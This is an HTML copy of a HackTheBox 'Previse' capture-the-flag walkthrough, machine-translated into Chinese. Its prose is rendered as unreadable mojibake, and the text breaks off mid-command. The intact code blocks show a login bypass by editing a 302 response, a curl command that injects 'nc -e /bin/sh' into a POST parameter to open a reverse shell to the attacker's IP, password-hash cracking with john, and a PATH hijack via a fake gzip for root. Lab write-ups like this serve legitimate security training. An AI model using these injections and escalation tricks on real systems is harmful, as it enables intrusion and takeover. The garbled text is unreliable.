<html>
<head>
<title>Previse from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">ä»é»‘å®¢ç›’å­é¢„è§ˆ-è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/previse-from-hackthebox-detailed-walkthrough-97ece9bba884?source=collection_archive---------1-----------------------#2021-12-21">https://infosecwriteups.com/previse-from-hackthebox-detailed-walkthrough-97ece9bba884?source=collection_archive---------1-----------------------#2021-12-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="eb6c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</p><h1 id="1886" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/db70010da163111627ff3656256b08f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*n0k_Np5hqAZ2S3G3.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ¥è‡ªé»‘å®¢ç›’å­çš„é¢„è§ˆ</figcaption></figure><p id="86f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Previseåœ¨HackTheBoxä¸Šè¢«è¯„ä¸ºç®€æ˜“æœºã€‚åˆæ­¥æ‰«ææ˜¾ç¤ºåªæœ‰ä¸¤ä¸ªå¼€æ”¾çš„ç«¯å£ã€‚æˆ‘ä»¬ä»80ç«¯å£çœ‹ç½‘ç«™å¼€å§‹ï¼Œé€šè¿‡æšä¸¾æ‰¾åˆ°éšè—æ–‡ä»¶ã€‚æˆ‘ä»¬é€šè¿‡æ›´æ”¹å“åº”ä»£ç æ¥è®¿é—®å¸æˆ·åˆ›å»ºé¡µé¢ï¼Œç„¶åä½¿ç”¨æ–°è·å¾—çš„è®¿é—®æƒé™ä¸‹è½½å¤‡ä»½æ–‡ä»¶ã€‚ä»£ç å®¡æŸ¥æ­ç¤ºäº†ç½‘ç«™ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬é€šè¿‡ç¯¡æ”¹å‚æ•°æ¥è·å¾—åå‘å¤–å£³ã€‚ä»MySQLè½¬å‚¨çš„å‡­è¯è¢«ç ´è§£ï¼Œå¹¶è¢«ç”¨æ¥ä½œä¸ºç”¨æˆ·ç™»å½•ã€‚ç„¶ååˆ©ç”¨è„šæœ¬ä¸­æœªåŠ å¼•å·çš„è·¯å¾„è·å¾—æ ¹å¤–å£³ã€‚</p><p id="2a5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€éœ€çš„æŠ€èƒ½æ˜¯ç½‘ç»œå’Œæ“ä½œç³»ç»Ÿæšä¸¾ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯æ”¹å˜å“åº”ä»£ç å’Œå‚æ•°ç¯¡æ”¹ã€‚</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.com/home/machines/profile/373" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">ç ´è§£ç›’å­::æ¸—é€æµ‹è¯•å®éªŒå®¤â€” Previse</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">ç™»å½•Hack The Boxå¹³å°ï¼Œè®©æ‚¨çš„ç¬”æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½æ›´ä¸Šä¸€å±‚æ¥¼ï¼</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.com</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="a4b2" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="f8fb" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/90b5621de91bfa3dc8d080d199c6651f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KvN2r0F3xXiZuRbrAqFL2g.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">Nmapæ‰«æ</figcaption></figure><p id="dc9d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç›®å‰ï¼Œæˆ‘ä»¬ä»nmapæ‰«æä¸­å¾—åˆ°çš„åªæ˜¯ä¸€ä¸ªç«¯å£80ä¸Šçš„ç½‘ç«™:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/76ab2e438c8407455906f811be382f0e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1220/format:webp/0*ctxWvVk63PK_pmi8.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">é¢„è§ˆæ–‡ä»¶å­˜å‚¨</figcaption></figure><h1 id="e5b6" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ–‡ä»¶å‘ç°</h1><p id="dfb3" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">è¿™æ˜¯ä¸€ä¸ªç®€å•çš„é™æ€ç™»å½•é¡µé¢ã€‚æºä»£ç ä¸­æ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Œferoxbusterçš„æ—¶é—´åˆ°äº†:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi my"><img src="../Images/0f50c7d3285914c4b6a998d5e0883c85.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nCuF_FHyoZpyGkf7H6ZQQg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">å¯¹phpæ–‡ä»¶è¿›è¡ŒFeroxbusteræ‰«æ</figcaption></figure><p id="1717" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†ä¸€äº›phpæ–‡ä»¶ã€‚ç¿»çœ‹é‚£äº›æœ‰200ä¸ªå“åº”ä»£ç çš„ï¼Œåªæœ‰nav.phpæ˜¯æœ‰è¶£çš„:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi mz"><img src="../Images/07a29e350e278cc13ff52900f937efdc.png" data-original-src="https://miro.medium.com/v2/resize:fit:724/format:webp/0*Ptd-K_Cp-2GMlykr.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">nav.phpæ–‡ä»¶çš„å†…å®¹</figcaption></figure><h1 id="5f51" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ›´æ”¹å“åº”ä»£ç </h1><p id="06bb" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æ‰€æœ‰é“¾æ¥éƒ½å°†æˆ‘ä»¬é‡å®šå‘åˆ°ç™»å½•é¡µé¢ï¼Œä½†å¦‚æœæˆ‘ä»¬å•å‡»åˆ›å»ºå¸æˆ·é“¾æ¥å¹¶ä½¿ç”¨Burpæ‹¦æˆªï¼Œåˆ™è®¾ç½®ä¸ºæ‹¦æˆªå“åº”:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi na"><img src="../Images/473f6102b33456fc22471b6decb79c20.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/0*TK8vtdGGECAWvOQx.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ‰“å—æ‹¦æˆªåˆ›å»ºå¸æˆ·å“åº”</figcaption></figure><p id="f083" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨ï¼Œå½“æˆ‘ä»¬å•å‡»forwardå‘é€getè¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬æ•è·åˆ°ä»¥ä¸‹å“åº”:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="93ef" class="ng km iq nc b gy nh ni l nj nk">HTTP/1.1 302 Found<br/>Date: Wed, 29 Sep 2021 20:08:28 GMT<br/>Server: Apache/2.4.29 (Ubuntu)<br/>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>Cache-Control: no-store, no-cache, must-revalidate<br/>Pragma: no-cache<br/>Location: login.php<br/>Content-Length: 3994<br/>Connection: close<br/>Content-Type: text/html; charset=UTF-8</span></pre><p id="7748" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™é‡Œæè¿°äº†302å‘ç°å“åº”<a class="ae nl" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302" rel="noopener ugc nofollow" target="_blank"/>:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="06fa" class="ng km iq nc b gy nh ni l nj nk">The HyperText Transfer Protocol (HTTP) 302 Found redirect status<br/>response code indicates that the resource requested has been<br/>temporarily moved to the URL given by the Location header.</span></pre><p id="46ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› æ­¤ï¼Œæˆ‘ä»¬å°†è¢«é‡å®šå‘åˆ°login.phpï¼Œä½†æˆ‘ä»¬å¯ä»¥å°†å“åº”ä»£ç æ”¹ä¸º200 OK:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="f72c" class="ng km iq nc b gy nh ni l nj nk">HTTP/1.1 200 OK<br/>Date: Wed, 29 Sep 2021 20:08:28 GMT<br/>Server: Apache/2.4.29 (Ubuntu)<br/>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br/>Cache-Control: no-store, no-cache, must-revalidate<br/>Pragma: no-cache<br/>Location: login.php<br/>Content-Length: 3994<br/>Connection: close<br/>Content-Type: text/html; charset=UTF-8</span></pre><p id="41de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨ï¼Œå½“æˆ‘ä»¬ä»¥æ‰“å—æ–¹å¼å‘é€å“åº”æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ‡æ¢å›æµè§ˆå™¨æŸ¥çœ‹accounts.phpé¡µé¢:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/7e6129bfe196f286ead0635115c8b2ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/0*KKbgodvx4rGLzchr.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç»•è¿‡302é‡å®šå‘ç™»å½•</figcaption></figure><h1 id="677e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">å¸æˆ·åˆ›å»º</h1><p id="981c" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå¸æˆ·ï¼Œç„¶åç™»å½•ï¼Œè¿™å°†ä½¿æˆ‘ä»¬è½¬åˆ°è¿™é‡Œ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/3031875fb0ff4e509812393045a3a9c8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/0*UVxC333tn5Stk5Ll.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç™»å½•åˆ°ç®¡ç†é¡µé¢</figcaption></figure><p id="d9c8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç‚¹å‡»æˆ‘æ‰¾åˆ°äº†æ–‡ä»¶é¡µé¢:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi no"><img src="../Images/bc60d20c8b986f61a2f6f408ddde8a8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/0*zzFbUKanXbL5aD76.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç®¡ç†åŒºçš„æ–‡ä»¶éƒ¨åˆ†</figcaption></figure><h1 id="8ef6" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">å¤‡ä»½æ–‡ä»¶</h1><p id="3bf1" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ä¸‹è½½å¤‡ä»½æ–‡ä»¶å¹¶æå–å†…å®¹å¯ä»¥ä»ç½‘ç«™ä¸Šè·å–æ‰€æœ‰æ–‡ä»¶:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="5fbe" class="ng km iq nc b gy nh ni l nj nk">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/previse]<br/>â””â”€# unzip siteBackup.zip <br/>Archive:  siteBackup.zip<br/>  inflating: accounts.php            <br/>  inflating: config.php              <br/>  inflating: download.php            <br/>  inflating: file_logs.php           <br/>  inflating: files.php               <br/>  inflating: footer.php              <br/>  inflating: header.php              <br/>  inflating: index.php               <br/>  inflating: login.php               <br/>  inflating: logout.php              <br/>  inflating: logs.php                <br/>  inflating: nav.php                 <br/>  inflating: status.php</span></pre><p id="b44e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘çš„ç›®å…‰è¢«config.phpçš„æ–‡ä»¶å¸å¼•ä½äº†ï¼Œè¿™é‡Œé¢åŒ…å«ç€å‡­æ®:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="f22e" class="ng km iq nc b gy nh ni l nj nk">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/previse]<br/>â””â”€# cat config.php <br/>&lt;?php<br/>function connectDB(){<br/>    $host = 'localhost';<br/>    $user = 'root';<br/>    $passwd = '&lt;HIDDEN&gt;';<br/>    $db = 'previse';<br/>    $mycon = new mysqli($host, $user, $passwd, $db);<br/>    return $mycon;<br/>}<br/>?&gt;</span></pre><p id="00f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ—¥å¿—æ–‡ä»¶ä¹Ÿå¾ˆæœ‰è¶£:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi np"><img src="../Images/710cee3a7ce5ce95e4f4e2cbf14df682.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Rz3HcpsxHUqMiq8AhGhLgQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">logs.phpæ–‡ä»¶çš„å†…å®¹</figcaption></figure><p id="6c9f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯¥è„šæœ¬ä½¿ç”¨execå‡½æ•°è°ƒç”¨pythonï¼Œç„¶åpythonæ‰§è¡Œä¸€ä¸ªpythonè„šæœ¬ï¼Œå¹¶ä»ç”¨æˆ·é‚£é‡Œè·å–å‚æ•°delimã€‚æˆ‘ä»¬å¯ä»¥ä»å‘½ä»¤è¡Œå¯¹æ­¤è¿›è¡Œæµ‹è¯•:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nq"><img src="../Images/d826659fe456e1bbb5e8c80b5c1f3462.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WmNvAyraHDXDXXbtA1KytA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æµ‹è¯•logs.phpæ–‡ä»¶çš„å‚æ•°</figcaption></figure><h1 id="2b40" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">å‚æ•°ç¯¡æ”¹</h1><p id="7d1b" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™æ˜¯å¯è¡Œçš„ï¼Œæˆ‘å¾—åˆ°äº†é€—å·åˆ†éš”çš„åˆ—è¡¨ã€‚æˆ‘ä»¬å¯ä»¥æ»¥ç”¨è¿™ç§æ¶ˆæ¯’è¾“å…¥çš„ç¼ºä¹æ¥è·å¾—ä¸€ä¸ªåå‘å¤–å£³ã€‚åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­å¯åŠ¨netcatä¾¦å¬ï¼Œç„¶åä½¿ç”¨URLç¼–ç çš„ç®€å•åå‘shell:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="aec2" class="ng km iq nc b gy nh ni l nj nk">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/previse]<br/>â””â”€# curl -v --cookie "PHPSESSID=1ovoh21p24c94mggubgc3j16dn" -d delim=comma%26nc+-e+/bin/sh+10.10.14.214+1337 http://previse.htb/logs.php <br/>*   Trying 10.10.11.104:80...<br/>* Connected to previse.htb (10.10.11.104) port 80 (#0)<br/>&gt; POST /logs.php HTTP/1.1<br/>&gt; Host: previse.htb<br/>&gt; User-Agent: curl/7.74.0<br/>&gt; Accept: */*<br/>&gt; Cookie: PHPSESSID=1ovoh21p24c94mggubgc3j16dn<br/>&gt; Content-Length: 45<br/>&gt; Content-Type: application/x-www-form-urlencoded<br/>&gt; <br/>* upload completely sent off: 45 out of 45 bytes</span></pre><p id="54db" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åˆ‡æ¢åˆ°æˆ‘ä»¬ç­‰å¾…çš„netcatç›‘å¬å™¨ï¼Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬å·²ç»è¿æ¥äº†æˆ‘ä»¬çš„shell:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="8970" class="ng km iq nc b gy nh ni l nj nk">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/previse]<br/>â””â”€# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.214] from (UNKNOWN) [10.10.11.104] 48260</span></pre><p id="a932" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å…ˆå‡çº§åˆ°æ›´å¥½çš„å¤–å£³:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="0beb" class="ng km iq nc b gy nh ni l nj nk">python -c 'import pty;pty.spawn("/bin/bash")'<br/>www-data@previse:/var/www/html$</span></pre><h1 id="40cc" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">MySQLæšä¸¾</h1><p id="ad6a" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬ä»…ä½œä¸ºä½æƒé™ç”¨æˆ·è¿›è¡Œè¿æ¥ï¼Œä½†ä¹‹å‰æˆ‘ä»¬å‘ç°äº†mysqlå‡­æ®ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æ•°æ®åº“:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/7fc86905b2cb0cb5b4aa596ecfadc361.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_Y0gwWcwW7AjpP4gl3r_Jw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æšä¸¾MySQLä»¥è½¬å‚¨å¯†ç å“ˆå¸Œ</figcaption></figure><h1 id="083e" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">å“ˆå¸Œç ´è§£</h1><p id="ae5a" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬æœ‰ç”¨æˆ·å’Œå¯†ç æ•£åˆ—ã€‚ç¬¬ä¸€ä¸ªåä¸ºm4lçš„ç”¨æˆ·ä¹‹å‰åœ¨ç½‘ç«™ä¸Šè¢«è§†ä¸ºåˆ›å»ºè€…ï¼Œè®©æˆ‘ä»¬è·å–è¯¥æ•£åˆ—ï¼Œçœ‹çœ‹æˆ‘ä»¬èƒ½å¦ç ´è§£å®ƒ:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="5261" class="ng km iq nc b gy nh ni l nj nk">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/previse]<br/>â””â”€# echo "\$1\$ğŸ§‚llol&lt;HIDDEN&gt;" &gt; hash.txt</span></pre><p id="4b33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨<a class="ae nl" href="https://vk9-sec.com/cracking-password-john-the-ripper/" rel="noopener ugc nofollow" target="_blank">è¿™ä¸ª</a>ç«™ç‚¹æ¥è¯†åˆ«å“ˆå¸Œç±»å‹ï¼Œå³md5:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="041a" class="ng km iq nc b gy nh ni l nj nk">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/previse]<br/>â””â”€# john hash.txt -format=md5crypt-long -w=/usr/share/wordlists/rockyou.txt<br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>&lt;HIDDEN&gt; (?)<br/>1g 0:00:06:16 DONE (2021-09-29 22:17) 0.002653g/s 19671p/s 19671c/s 19671C/s ilovecodydean..ilovecody..<br/>Use the "--show" option to display all of the cracked passwords reliably<br/>Session completed</span></pre><h1 id="3de9" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç”¨æˆ·æ ‡å¿—</h1><p id="5004" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ç°åœ¨æˆ‘ä»¬æœ‰äº†å¯ä»¥é€šè¿‡SSHç™»å½•çš„å‡­è¯:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="56ed" class="ng km iq nc b gy nh ni l nj nk">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/previse]<br/>â””â”€# ssh m4lwhere@previse.htb                        <br/>The authenticity of host 'previse.htb (10.10.11.104)' can't be established.<br/>ECDSA key fingerprint is SHA256:rr7ooHUgwdLomHhLfZXMaTHltfiWVR7FJAe2R7Yp5LQ.<br/>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>Warning: Permanently added 'previse.htb,10.10.11.104' (ECDSA) to the list of known hosts.<br/>m4lwhere@previse.htb's password: <br/>Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)<br/>Last login: Wed Sep 29 18:53:44 2021 from 10.10.14.191<br/>m4lwhere@previse:~$</span></pre><p id="f43a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è®©æˆ‘ä»¬æŠ“ä½ç”¨æˆ·æ ‡å¿—:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="496b" class="ng km iq nc b gy nh ni l nj nk">m4lwhere@previse:~$ cat user.txt<br/>&lt;HIDDEN&gt;</span></pre><h1 id="6146" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æƒé™æå‡</h1><p id="6443" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘é¦–å…ˆæ£€æŸ¥çš„æ˜¯sudoæƒé™:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="c7c2" class="ng km iq nc b gy nh ni l nj nk">m4lwhere@previse:~$ sudo -l<br/>[sudo] password for m4lwhere: <br/>User m4lwhere may run the following commands on previse:<br/>    (root) /opt/scripts/access_backup.sh<br/>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh</span></pre><p id="dcf0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¯«ä¸å¥‡æ€ªï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†å‡çº§è·¯å¾„ã€‚çœ‹ç€å‰§æœ¬:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="971a" class="ng km iq nc b gy nh ni l nj nk"># We always make sure to store logs, we take security SERIOUSLY here<br/><br/># I know I shouldnt run this as root but I cant figure it out programmatically on my account<br/># This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time<br/><br/>gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz<br/>gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz</span></pre><p id="165b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°å®ƒåªæ˜¯å‹ç¼©æ—¥å¿—ï¼Œä½†æ˜¯æ²¡æœ‰gzipå¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ›å»ºè‡ªå·±çš„gzipæ–‡ä»¶å¹¶ä½¿ç”¨å®ƒ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ns"><img src="../Images/580d3a04437e7a4df6d980293e13d6cb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*keyhjgIbZrQthDQy2e5Yog.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">åˆ©ç”¨è·¯å¾„é”™è¯¯é…ç½®åˆ›å»ºæˆ‘ä»¬è‡ªå·±çš„gzip</figcaption></figure><p id="5702" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬åˆšåˆšåœ¨å½“å‰æ–‡ä»¶å¤¹ä¸­åˆ›å»ºäº†ä¸€ä¸ªåä¸ºgzipçš„æ–‡ä»¶ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªåå‘shellã€‚ç„¶åæˆ‘ä½¿å®ƒå¯æ‰§è¡Œï¼Œå¹¶å°†å½“å‰æ–‡ä»¶å¤¹æ·»åŠ åˆ°ç³»ç»Ÿè·¯å¾„ä¸­ã€‚</p><h1 id="1515" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ ¹æ ‡å¿—</h1><p id="6c36" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥rootç”¨æˆ·èº«ä»½è¿è¡Œå¤‡ä»½è„šæœ¬ï¼Œå¦ä¸€ä¸ªnetcatåœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­ç­‰å¾…:</p><pre class="lk ll lm ln gt nb nc nd ne aw nf bi"><span id="92dc" class="ng km iq nc b gy nh ni l nj nk">m4lwhere@previse:~$ sudo 